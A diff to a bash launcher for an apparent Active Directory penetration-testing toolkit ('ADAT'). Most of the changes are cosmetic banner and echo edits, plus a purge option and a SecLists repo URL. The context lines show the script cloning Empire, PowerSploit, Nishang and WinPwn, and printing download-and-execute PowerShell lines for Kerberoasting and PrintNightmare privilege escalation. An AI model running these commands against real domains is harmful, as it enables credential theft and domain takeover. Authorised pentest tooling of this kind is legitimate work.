@@ -29,6 +29,7 @@ PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSy
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
+SecListsRepo="https://github.com/danielmiessler/SecLists.git";
 
 LocalRepo="False"
 
@@ -78,18 +79,19 @@ echo -e "									${LGREEN}Checking Prerequisites${RESTORE}"
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 
-ansi2htmlInstalled="$HOME/.local/lib/python3.9/site-packages/ansi2html"
+ansi2htmlInstalled="$HOME/.local/bin/ansi2html"
 
-if [ -d "$ansi2htmlInstalled" ]
+if [ -f "$ansi2htmlInstalled" ]
 then
 	echo -e ""
 	echo -e "${LGREEN}ansi2html is installed${RESTORE}"
 else
 	echo -e ""
 	echo -e "${LGREEN}Installing ansi2html${RESTORE}"
-    pip3 install ansi2html
+    	pip3 install ansi2html
     	echo -e ""
     	echo -e "${LGREEN}ansi2html is installed${RESTORE}"
+    	echo -e ""
     
 fi
 
@@ -114,7 +116,7 @@ WinPwnLocalRepo="$HOME/ADAT/WinPwn"
 if [ -d "$EmpireLocalRepo" ] 
 then
 	echo -e ""
-    	echo "Empire is installed, checking if updated to latest version."
+    	echo -e "Empire is installed, checking if updated to latest version."
     	cd $EmpireLocalRepo
     	git pull "https://github.com/BC-SECURITY/Empire.git"
     	echo -e ""
@@ -128,10 +130,10 @@ fi
 if [ -d "$NishangLocalRepo" ] 
 then
     	echo -e ""
-    	echo "Nishang is installed, checking if updated to latest version."
+    	echo -e "Nishang is installed, checking if updated to latest version."
     	cd $NishangLocalRepo
     	git pull "https://github.com/samratashok/nishang.git"
-    	echo -e ""
+    	echo -e "" 
 else
 	echo -e ""
 	echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
@@ -144,7 +146,7 @@ fi
 if [ -d "$PowerSploitLocalRepo" ] 
 then
 	echo -e ""
-    	echo "PowerSploit is installed, checking if updated to latest version."
+    	echo -e "PowerSploit is installed, checking if updated to latest version."
     	cd $PowerSploitLocalRepo
     	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
     	echo -e ""
@@ -159,7 +161,7 @@ fi
 if [ -d "$WinPwnLocalRepo" ] 
 then
 	echo -e ""
-    	echo "WinPwn is installed, checking if updated to latest version."
+    	echo -e "WinPwn is installed, checking if updated to latest version."
     	cd $WinPwnLocalRepo
     	git pull "https://github.com/S3cur3Th1sSh1t/WinPwn.git"
  	echo -e ""
@@ -179,6 +181,13 @@ cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
 echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+
+}
+
+Function_Purge (){
+
+rm -rfv $HOME/ADAT
+
 
 }
 
@@ -242,6 +251,13 @@ while [ $# -gt 0 ]; do
 		Function_LocalRepo;
                 shift
                 ;;
+
+        -P | --purge)
+                Function_Purge
+                break;
+                shift
+                shift
+                ;;
                                                                                                                                                       
                 
         #*)
@@ -254,16 +270,15 @@ done
 ################################################################################
 # Main                                                                   #
 ################################################################################
+echo -e ""
+echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "							${LGREEN}Prerequisite checks completed. Preparing to launch ADAT${RESTORE}"
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e ""
+echo -e ""
+echo -e ""
 
-echo -e "${LGREEN}Prerequisite checks completed. Preparing to launch ADAT.${RESTORE}"
-
-echo -ne '#####                     (33%)\r'
-sleep 1
-echo -ne '##############             (69%) Nice\r'
-sleep 2
-echo -ne '###############################(100%)\r'
-sleep 1
-echo -ne '\n'
+sleep 7
 
 clear
 
@@ -629,7 +644,7 @@ echo -e "									${LGREEN}♠ Internal Commands ♠${RESTORE}"
 echo -e "     	 					${LIGHTGRAY}This section is used for running scripts and commands internally on a Domain Controller${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-echo -e "									  ${LGREEN}Credential Access${RESTORE}"
+echo -e "									  ${LGREEN} Credential Access ${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e ""
 # Credential Dumping
@@ -682,7 +697,7 @@ echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Kerberoast.ps1);Invoke-
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command kerberoast"
 echo -e ""
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-echo -e "									  ${LGREEN}♠ Privilege Escalation ♠${RESTORE}"
+echo -e "									  ${LGREEN} Privilege Escalation ${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
@@ -709,7 +724,7 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-
 echo -e ""
 
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-echo -e "										${LGREEN}♠ Enumeration ♠${RESTORE}"
+echo -e "										${LGREEN} Enumeration ${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
@@ -752,8 +767,10 @@ echo -e ""
 echo -e ""
 
 if [ $LocalRepo == "True" ]
-then
-	echo -e "					${LYELLOW}			---> Press "'t'" to terminate script and python server <---${RESTORE}"
+then	
+	echo -e "${LYELLOW}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+	echo -e "					${LYELLOW}		---> Press '"t"' to terminate script and python server <---${RESTORE}"
+	echo -e "${LYELLOW}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 	echo -e ""
 	echo -e ""
 	echo -e ""
